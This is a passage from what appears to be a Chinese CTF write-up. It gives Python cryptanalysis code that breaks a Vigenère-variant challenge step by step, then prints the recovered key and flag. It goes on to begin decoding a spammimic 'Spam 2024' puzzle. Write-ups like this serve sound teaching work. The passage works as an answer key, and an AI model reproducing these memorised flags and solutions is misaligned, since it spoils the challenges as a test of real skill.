jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span><br>    <span class="hljs-comment">#</span><br>    <span class="hljs-comment"># print(recv)</span><br>    <span class="hljs-comment"># print(len(recv))</span><br>    index = <span class="hljs-number">0</span><br>    idx_arr=[]<br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> recv:<br>        <span class="hljs-keyword">if</span> ch.isalpha():<br>            idx_arr.append(index)<br>            index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            idx_arr.append(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># print(idx_arr)</span><br>    start = <span class="hljs-number">609</span><br>    <span class="hljs-comment"># start = 0</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-string">&#x27;W4terCTF&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">start, <span class="hljs-built_in">min</span></span>):<br>        <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">min</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.isalpha():<br>                <span class="hljs-keyword">continue</span><br>            mi_i = start + i<br>            mi = recv[mi_i]<br>            mi_idx=idx_arr[mi_i]<br>            <span class="hljs-keyword">if</span> x.isupper():<br>                base = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                base = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>            val = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>            <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> val:<br>                <span class="hljs-keyword">if</span> (mi_idx+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span> == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(x)-base+mi_idx*(<span class="hljs-built_in">ord</span>(v)-<span class="hljs-number">65</span>))%<span class="hljs-number">26</span> == <span class="hljs-built_in">ord</span>(mi)-base <span class="hljs-keyword">or</span> (mi_idx+<span class="hljs-number">1</span>) % <span class="hljs-number">2</span> != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(x)-base-mi_idx*(<span class="hljs-built_in">ord</span>(v)-<span class="hljs-number">65</span>)) % <span class="hljs-number">26</span> == <span class="hljs-built_in">ord</span>(mi)-base:<br>                    <span class="hljs-built_in">print</span>(v, end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;x&#125;</span>,<span class="hljs-subst">&#123;mi&#125;</span>,<span class="hljs-subst">&#123;mi_idx&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>    test(start,<span class="hljs-built_in">min</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------&#x27;</span>)<br>    start=<span class="hljs-number">0</span><br>    <span class="hljs-built_in">min</span>=<span class="hljs-string">&#x27;Hello&#x27;</span><br>    <span class="hljs-comment"># test(start,min)</span><br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>运行结果如下，为密钥其中连续七位可能的取值，每一位可能会出现多种取值，所以有些行有两个字母</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">K X <br>W,Q,496<br><br>O <br>t,d,497<br><br>J W<br>e,o,498<br><br>J<br>r,y,499<br><br>H U<br>C,S,500<br><br>O<br>T,Z,501<br><br>G T<br>F,B,502<br></code></pre></td></tr></table></figure>
<p>然后，利用下面的代码，用部分密钥尝试还原出原文</p>
<p>因为只知道密钥的一部分，所以只能还原原文的一些片段。具体的操作为，考虑到密钥的长度在10和20之间，枚举密钥的长度，对于每个枚举，根据<code>Q4doySZB</code>在密文中的位置推算已知密钥片段在密钥中的位置</p>
<p>另外，考虑到密钥已知部分的每一位都可能有多种取值，还需要用回溯法枚举所有可能的密钥片段，可能性只有16种，数量不是很大</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>recv = <span class="hljs-string">&#x27;Vqcvh! Pd beoq, m bhkhbu bxohuowrlkux fljknkh, oufr bysgocsklze au vydo loydcy uab bybrxcr rr hne xcmsziopexqm bd Lqjk. Qbmi Owyaiy, xy tuxa Fyzyrp uv Lgkcxo, bg ot Xycdpwk kp nty Imd fevrfm, dhk Baeuxd, Cqtecbqx, nq zxu ukwi Lbhgl Xisml el pry Hyegyycoicxkws toy Poxlhgpom ibnr zxue lhgu Owrihcon. Oecafyd, nugy Lqrllskl Josknkdpet kp u ns-tmtu Lkuuxyhb, ytchnc Cybepcqx, nlj xqy Siauw hu Vchaepin pryey Ictqb gkx Zykirepn Foycoj fuzahyxt-ytd Pmsx otd Xiemoigbshs nuc Byerbhxbr Jockiec hdj Rylmwvmai Lolfejbct oh Pyvpjokx. Uycqqz jxop Pshmsd oh Pobieyeds, m Prgrut Bbmxyzs uf Xcxnpsgpsiz yzcxwuy: x Pehbohlg Q4doySZB&#123;lYzyNRN_Jx3_sXMo_lBU3T3RG_5NBvR3I_84Ig_GcFB_i3L934ts3&#125;, okq Pmltqoowm Fojjun pid Pvazehe. Qbi egze Vglnsjj oo Fyzarytsu; g Syrtxhza, jyvn hi g Rynupr, luj yt Sumd, ycx tjy Fkskk wxx Hyeyiyje lz wkvv yhcfv yuu jwi Puhqgiqjk qbi Lbuolchd kut zdo Pulgsuki. Bblmbr, hniu Psmooyoycey bd Buhhfuku Oskru gyca Lknliey, lcz myzecr ymg Bonowoz boac nty Ighhqtq Psyvs uf Xuvskqzeyh. Uh gfoi Lkfh, mj bg sy Xybi neuz rizie ru cukq ssk tbj yqo wkf sghv gq P.&#x27;</span><br><span class="hljs-comment"># recv = &#x27;Q4doySZB&#x27;</span><br><span class="hljs-comment"># from secret import original_text</span><br><span class="hljs-comment"># print(original_text)</span><br><br>start = <span class="hljs-number">496</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_vigenere_variant</span>(<span class="hljs-params">plaintext, key</span>):<br>    key_index = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    text_index = key_index<br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> plaintext:<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            <span class="hljs-keyword">if</span> key[key_index % key_length] == <span class="hljs-string">&#x27;?&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;?&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                key_index += <span class="hljs-number">1</span><br>                text_index += <span class="hljs-number">1</span> <br>                <span class="hljs-keyword">continue</span><br>            key_char = key[key_index % key_length].upper()<br>            key_offset = <span class="hljs-built_in">ord</span>(key_char) - <span class="hljs-number">65</span><br><br>            <span class="hljs-keyword">if</span> char.isupper():<br>                base = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                base = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> (text_index + <span class="hljs-number">1</span>) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>                out = []<br>                <span class="hljs-keyword">for</span> ori <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(char) == (ori + text_index * key_offset) % <span class="hljs-number">26</span> + base:<br>                        out.append(<span class="hljs-built_in">chr</span>(ori+base))<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(out) == <span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;()&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(out) == <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(out[<span class="hljs-number">0</span>], end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(out, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>            <span class="hljs-keyword">else</span>:<br>                out = []<br>                <span class="hljs-keyword">for</span> ori <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(char) == (ori - text_index * key_offset) % <span class="hljs-number">26</span> + base:<br>                        out.append(<span class="hljs-built_in">chr</span>(ori+base))<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(out) == <span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;()&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(out) == <span class="hljs-number">1</span>:<br>                    <span class="hljs-built_in">print</span>(out[<span class="hljs-number">0</span>], end=<span class="hljs-string">&#x27;&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(out, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>            <span class="hljs-comment"># ciphertext += encrypted_char</span><br>            key_index += <span class="hljs-number">1</span><br>            text_index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(char, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br>length = random.randint(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)<br><br><br>arr = [[<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>],<br>       [<span class="hljs-string">&#x27;O&#x27;</span>],<br>       [<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>],<br>       [<span class="hljs-string">&#x27;J&#x27;</span>],<br>       [<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>],<br>       [<span class="hljs-string">&#x27;O&#x27;</span>],<br>       [<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>]]<br>random_key_arr = []<br>random_key = <span class="hljs-string">&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_idx</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">global</span> random_key, random_key_arr<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(arr):<br>        <span class="hljs-built_in">print</span>(random_key)<br>        decrypt_vigenere_variant(recv, random_key)<br>        <span class="hljs-comment"># print(f&#x27;&#123;decrypted&#125;&#x27;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n------------&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> arr[i]:<br>        random_key_arr.append(x)<br>        random_key = <span class="hljs-string">&#x27;&#x27;</span>.join(random_key_arr)<br>        try_idx(i+<span class="hljs-number">1</span>)<br>        random_key_arr.pop(<span class="hljs-built_in">len</span>(random_key_arr)-<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># print(random_key)</span><br><br>lkey = <span class="hljs-built_in">len</span>(arr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;len(key)=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>    mod = start % i<br>    old_arr = arr.copy()<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mod):<br>        arr.insert(<span class="hljs-number">0</span>,[<span class="hljs-string">&#x27;?&#x27;</span>])<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(arr) &lt; i:<br>        arr.append([<span class="hljs-string">&#x27;?&#x27;</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(arr) == i:<br>        try_idx(<span class="hljs-number">0</span>)<br>    arr=old_arr<br></code></pre></td></tr></table></figure>
<p>运行后的输出比较长，需要人工筛选出合理的，即在里面找到一篇文章，已完全解密的单词都是合法的单词</p>
<p>可以发现，密钥长度为13时，大多数已解密的单词都是合法的</p>
<p>密钥为 <code>??KOWJHOG????</code> 时解密效果最好，结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">??ilx! In vi??, ? ???ble vaud??????an veter??, ???? vicario???? ?? both vic??? ??? villain ?? ??? ?icissit???? ?? Fate. Thi? ?????e, no mere ?????? of Vanit?, ?? ?? ?estige o? ??? ??x populi, ??? ???ant, Vani????, ?? the once ????? ?oice of t?? ????similit??? ??? Venerat?? ???? they onc? ?????ied. Howe???, ???s Valoro?? ????tation o? ? ??-??ne Vexat???, ???nds Vivi????, ??d has Vow?? ?? ??nquish t???? ??nal and V??????t Vermin ??????rd-ing Vi?? ??? ?ouchsaf??? ??? Violent?? ????ous and V??????us Viola???? ?? Volitio?. ?????t this Vo???? ?? Verbosi??, ? ???led Vest??? ?? ?indicat??? ???rges: a Va?????? W4terCTF&#123;??????H_Th3_mASk_???3?3??_5TRlK3S_84Ck_????_?3?934nc3&#125;, yet Vi??????s Vector ??? ???tory. The ???? ??rdict is ??????nce; a Ven?????, ?eld as a V?????, ?ot in Vai?, ??? ??e Value a?? ????city of s??? ???ll one da? ?????cate the ??????nt and th? ?????ous. Veri??, ???? Vichyss???? ?? Verbiag? ????? most Ver????, ??t within ??? ???umes lie? ??? ??brant Vo??? ?? ?alidati??. ?? ??is Vein, i? ?? ?? ?ery good ????? ?o meet yo? ??? ??u may cal? ?? ?.<br></code></pre></td></tr></table></figure>
<p>可以大胆猜测，其中的<code>Howe???, ???s</code>原文是However, this，重复上面的操作，尝试逆推出密钥的另一部分</p>
<p>以下可以复用上面的代码，可以推测更长的密钥片段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">[[<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>],<br> [<span class="hljs-string">&#x27;O&#x27;</span>],<br> [<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>],<br> [<span class="hljs-string">&#x27;J&#x27;</span>],<br> [<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>],<br> [<span class="hljs-string">&#x27;O&#x27;</span>],<br> [<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>],<br> [<span class="hljs-string">&#x27;W&#x27;</span>],<br> [<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>],<br> [<span class="hljs-string">&#x27;G&#x27;</span>],<br>]<br></code></pre></td></tr></table></figure>
<p>然后用更长的密钥片段尝试解密原文，筛选出其中有效的如下</p>
<p>密钥为<code>??KOWJHOGWPG?</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">??ilx! In view, a ???ble vaudevi???an veteran, c??? vicariousl? ?? both victim ??? villain by t?? ?icissitude? ?? Fate. This Vi???e, no mere Ven??? of Vanity, is ?? ?estige of th? ??x populi, now ???ant, Vanishe?, ?? the once Vit?? ?oice of the V???similitude ??? Venerates w??? they once Vi???ied. However, ???s Valorous V???tation of a b?-??ne Vexation, ???nds Vivifie?, ??d has Vowed t? ??nquish thes? ??nal and Viru???t Vermin van???rd-ing Vice a?? ?ouchsafing ??? Violently V???ous and Vora???us Violatio? ?? Volition. Am???t this Vorte? ?? Verbosity, a ???led Vestige ?? ?indication ???rges: a Varia??? W4terCTF&#123;bEn???H_Th3_mASk_vIG3?3??_5TRlK3S_84Ck_WiT?_?3?934nc3&#125;, yet Vivac???s Vector for ???tory. The onl? ??rdict is Ven???nce; a Vendet??, ?eld as a Voti??, ?ot in Vain, fo? ??e Value and V???city of such ???ll one day Vi???cate the Vig???nt and the Vi???ous. Verily, t??? Vichyssois? ?? Verbiage Ve??? most Verbos?, ??t within its ???umes lies th? ??brant Voice ?? ?alidation. I? ??is Vein, it is ?? ?ery good hon?? ?o meet you an? ??u may call me ?.<br></code></pre></td></tr></table></figure>
<p>继续重复上面的操作1-2次，得到真正的密钥和原文</p>
<p>密钥<code>BYKOWJHOGWPGG</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Voilx! In view, a humble vaudevillian veteran, cast vicariously as both victim and villain by the vicissitudes of Fate. This Visage, no mere Veneer of Vanity, is it Vestige of the Vox populi, now Vacant, Vanished, as the once Vital Voice of the Verisimilitude now Venerates what they once Vilified. However, this Valorous Visitation of a by-gone Vexation, stands Vivified, and has Vowed to Vanquish these Venal and Virulent Vermin vanguard-ing Vice and Vouchsafing the Violently Vicious and Voracious Violation of Volition. Amidst this Vortex of Verbosity, a Veiled Vestige of Vindication emerges: a Variable W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;, yet Vivacious Vector for Victory. The only Verdict is Vengeance; a Vendetta, held as a Votive, not in Vain, for the Value and Veracity of such shall one day Vindicate the Vigilant and the Virtuous. Verily, this Vichyssoise of Verbiage Veers most Verbose, yet within its Volumes lies the Vibrant Voice of Validation. In this Vein, it is my Very good honor to meet you and you may call me V.<br></code></pre></td></tr></table></figure>
<p>拿到flag</p>
<p><code>W4terCTF&#123;bEneATH_Th3_mASk_vIG3N3RE_5TRlK3S_84Ck_WiTH_v3N934nc3&#125;</code></p>
<h3 id="Spam-2024">Spam 2024</h3>
<p>下载得到一篇很长的垃圾邮件</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://forum.rtsec.cn/d/116-gong-fang-shi-jie-crypto-ji-chu-ti-mu-cryptola-ji-you-jian">https://forum.rtsec.cn/d/116-gong-fang-shi-jie-crypto-ji-chu-ti-mu-cryptola-ji-you-jian</a></p>
<p>使用<a target="_blank" rel="noopener" href="https://www.spammimic.com/%EF%BC%8CDecode%E6%AD%A3%E6%96%87%E9%83%A8%E5%88%86%EF%BC%8C%E5%BE%97%E5%88%B0">https://www.spammimic.com/，Decode正文部分，得到</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">59</span>,<span class="hljs-number">6</span>f,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">6</span>c,<span class="hljs-number">69</span>,<span class="hljs-number">6</span>b,<span class="hljs-number">65</span>,<span class="hljs-number">20</span>,<span class="hljs-number">65</span>,<span class="hljs-number">6</span>d,<span class="hljs-number">6</span>f,<span class="hljs-number">6</span>a,<span class="hljs-number">69</span>,<span class="hljs-number">73</span>,<span class="hljs-number">2</span>c,<span class="hljs-number">20</span>,<span class="hljs-number">64</span>,<span class="hljs-number">6</span>f,<span class="hljs-number">6</span>e,<span class="hljs-number">27</span>,<span class="hljs-number">74</span>,<span class="hljs-number">20</span>,<span class="hljs-number">79</span>,<span class="hljs-number">6</span>f,<span class="hljs-number">75</span>,<span class="hljs-number">3</span>f,<span class="hljs-number">0</span>a,<span class="hljs-number">0</span>a,<span class="hljs-number">01</span>f643,<span class="hljs-number">01</span>f4b5,<span class="hljs-number">01</span>f33f,<span class="hljs-number">01</span>f3a4,<span class="hljs-number">01</span>f6aa,<span class="hljs-number">01</span>f30f,<span class="hljs-number">01</span>f40e,<span class="hljs-number">01</span>f94b,<span class="hljs-number">01</span>f6ab,<span class="hljs-number">01</span>f606,<span class="hljs-number">2705</span>,<span class="hljs-number">01</span>f606,<span class="hljs-number">01</span>f6b0,<span class="hljs-number">01</span>f4c2,<span class="hljs-number">01</span>f32a,<span class="hljs-number">263</span>a,<span class="hljs-number">01</span>f6e9,<span class="hljs-number">01</span>f30f,<span class="hljs-number">01</span>f4c2,<span class="hljs-number">01</span>f579,<span class="hljs-number">01</span>f993,<span class="hljs-number">01</span>f405,<span class="hljs-number">01</span>f375,<span class="hljs-number">01</span>f388,<span class="hljs-number">01</span>f600,<span class="hljs-number">01</span>f504,<span class="hljs-number">01</span>f6ab,<span class="hljs-number">01</span>f3a4,<span class="hljs-number">01</span>f993,<span class="hljs-number">2705</span>,<span class="hljs-number">01</span>f4ee,<span class="hljs-number">01</span>f3a4,<span class="hljs-number">01</span>f385,<span class="hljs-number">01</span>f34e,<span class="hljs-number">01</span>f643,<span class="hljs-number">01</span>f309,<span class="hljs-number">01</span>f383,<span class="hljs-number">01</span>f34d,<span class="hljs-number">01</span>f374,<span class="hljs-number">01</span>f463,<span class="hljs-number">01</span>f6b9,<span class="hljs-number">01</span>f923,<span class="hljs-number">01</span>f418,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">263</span>a,<span class="hljs-number">01</span>f463,<span class="hljs-number">01</span>f4a7,<span class="hljs-number">01</span>f463,<span class="hljs-number">01</span>f993,<span class="hljs-number">01</span>f33f,<span class="hljs-number">2328</span>,<span class="hljs-number">01</span>f32a,<span class="hljs-number">01</span>f30f,<span class="hljs-number">01</span>f643,<span class="hljs-number">01</span>f375,<span class="hljs-number">2753</span>,<span class="hljs-number">2602</span>,<span class="hljs-number">01</span>f309,<span class="hljs-number">01</span>f606,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">01</span>f375,<span class="hljs-number">01</span>f4a7,<span class="hljs-number">01</span>f385,<span class="hljs-number">01</span>f449,<span class="hljs-number">01</span>f30a,<span class="hljs-number">01</span>f6b9,<span class="hljs-number">01</span>f6aa,<span class="hljs-number">01</span>f374,<span class="hljs-number">01</span>f60e,<span class="hljs-number">01</span>f383,<span class="hljs-number">01</span>f32a,<span class="hljs-number">01</span>f643,<span class="hljs-number">01</span>f441,<span class="hljs-number">01</span>f94b,<span class="hljs-number">01</span>f451,<span class="hljs-number">01</span>f4a7,<span class="hljs-number">01</span>f418,<span class="hljs-number">01</span>f3a4,<span class="hljs-number">01</span>f94b,<span class="hljs-number">01</span>f418,<span class="hljs-number">01</span>f6e9,<span class="hljs-number">01</span>f923,<span class="hljs-number">01</span>f309,<span class="hljs-number">01</span>f6e9,<span class="hljs-number">23</span>e9,<span class="hljs-number">01</span>f60d,<span class="hljs-number">2753</span>,<span class="hljs-number">01</span>f418,<span class="hljs-number">01</span>f621,<span class="hljs-number">2600</span>,<span class="hljs-number">01</span>f60d,<span class="hljs-number">01</span>f643,<span class="hljs-number">01</span>f601,<span class="hljs-number">01</span>f600,<span class="hljs-number">01</span>f601,<span class="hljs-number">01</span>f6ab,<span class="hljs-number">01</span>f4c2,<span class="hljs-number">2705</span>,<span class="hljs-number">2603</span>,<span class="hljs-number">01</span>f6ab,<span class="hljs-number">01</span>f60e,<span class="hljs-number">01</span>f52a,<span class="hljs-number">01</span>f451,<span class="hljs-number">01</span>f600,<span class="hljs-number">01</span>f579,<span class="hljs-number">01</span>f6ab,<span class="hljs-number">01</span>f60d,<span class="hljs-number">01</span>f32a,<span class="hljs-number">01</span>f4c2,<span class="hljs-number">01</span>f44c,<span class="hljs-number">01</span>f34d,<span class="hljs-number">01</span>f44c,<span class="hljs-number">01</span>f993,<span class="hljs-number">01</span>f590,<span class="hljs-number">01</span>f923,<span class="hljs-number">01</span>f60e,<span class="hljs-number">01</span>f3ce,<span class="hljs-number">01</span>f34d,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">01</span>f34c,<span class="hljs-number">01</span>f34d,<span class="hljs-number">01</span>f3a4,<span class="hljs-number">2600</span>,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">01</span>f388,<span class="hljs-number">01</span>f6b0,<span class="hljs-number">01</span>f4a7,<span class="hljs-number">2600</span>,<span class="hljs-number">2709</span>,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">01</span>f34d,<span class="hljs-number">01</span>f993,<span class="hljs-number">01</span>f385,<span class="hljs-number">01</span>f374,<span class="hljs-number">2602</span>,<span class="hljs-number">23</span>e9,<span class="hljs-number">01</span>f6aa,<span class="hljs-number">01</span>f40d,<span class="hljs-number">263</span>a,<span class="hljs-number">01</span>f418,<span class="hljs-number">01</span>f607,<span class="hljs-number">01</span>f621,<span class="hljs-number">01</span>f375,<span class="hljs-number">01</span>f30f,<span class="hljs-number">01</span>f993,<span class="hljs-number">01</span>f375,<span class="hljs-number">01</span>f6e9,<span class="hljs-number">01</span>f4c2,<span class="hljs-number">01</span>f44c,<span class="hljs-number">01</span>f3f9,<span class="hljs-number">01</span>f5d2,<span class="hljs-number">01</span>f5d2,<span class="hljs-number">0</span>a,<span class="hljs-number">0</span>a,<span class="hljs-number">42</span>,<span class="hljs-number">74</span>,<span class="hljs-number">77</span>,<span class="hljs-number">2</span>c,<span class="hljs-number">20</span>,<span class="hljs-number">74</span>,<span class="hljs-number">68</span>,<span class="hljs-number">65</span>,<span class="hljs-number">20</span>,<span class="hljs-number">6</span>b,<span class="hljs-number">65</span>,<span class="hljs-number">79</span>,<span class="hljs-number">20</span>,<span class="hljs-number">69</span>,<span class="hljs-number">73</span>,<span class="hljs-number">20</span>,<span class="hljs-number">22</span>,<span class="hljs-number">4</span>b,<span class="hljs-number">45</span>,<span class="hljs-number">59</span>,<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>
<p>From HEX</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">You <span class="hljs-built_in">like</span> emojis, don<span class="hljs-comment">&#x27;t you?</span><br>(乱码)<br>Btw, the <span class="hljs-keyword">key</span> <span class="hljs-built_in">is</span> <span class="hljs-string">&quot;KEY&quot;</span><br></code></pre></td></tr></table></figure>
